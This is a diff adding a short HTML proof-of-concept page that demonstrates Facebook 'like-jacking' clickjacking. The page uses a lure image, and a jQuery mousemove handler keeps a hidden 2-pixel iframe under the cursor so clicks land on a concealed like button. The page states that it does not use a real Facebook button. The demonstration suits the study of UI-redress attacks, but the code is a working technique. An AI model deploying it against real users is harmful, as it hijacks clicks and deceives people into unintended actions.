@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Faceboook clickjacking ("like-jacking")</title>
+  </head>
+  <body>
+    <h2>Faceboook clickjacking ("like-jacking")</h2>
+    <img src="boobs.png">
+    <div id="invisible" style="border:0; width:2px; height:2px; position:absolute; background:#000;"><iframe src="fb_like_wrapper.html" style="border:0; width:2px; height:2px; margin:0; padding:0; position:absolute" scrolling="no" frameborder="0"></iframe></div>
+    
+    <p>Using the 'mousemove' event a 1x1 pixel facebook like button is always positioned under the cursor. Try to click on the image above.</p>
+    <p style="color:#999">(this example isn't using a real facebook like button)</p>
+    
+    
+    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js"></script>
+    <script>
+      $(function() {
+        $('body').mousemove(function(e) {
+          $('#invisible')
+            .css('left', e.pageX-1+'px')
+            .css('top', e.pageY-1+'px');
+        });
+      });
+    </script>
+  </body>
+<html>
